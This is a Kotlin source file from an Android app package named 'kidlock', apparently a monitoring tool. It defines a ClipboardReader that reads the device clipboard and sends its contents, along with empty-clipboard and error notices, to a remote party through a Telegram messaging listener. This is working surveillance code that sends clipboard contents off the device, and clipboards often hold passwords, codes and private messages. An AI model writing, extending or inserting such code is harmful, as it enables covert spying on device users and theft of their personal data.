package com.kidlock

import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper

object ClipboardReader {

    fun readAndSend(context: Context) {
        Handler(Looper.getMainLooper()).post {
            try {
                val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val text = cm.primaryClip?.getItemAt(0)?.getText(context.contentResolver)?.toString()
                if (!text.isNullOrBlank()) {
                    TelegramListener.instance.sendMessage("📋 Clipboard:\n$text")
                } else {
                    TelegramListener.instance.sendMessage("📋 Clipboard is empty.")
                }
            } catch (e: Exception) {
                TelegramListener.instance.sendMessage("📋 Clipboard read failed: ${e.message}")
            }
        }
    }
}
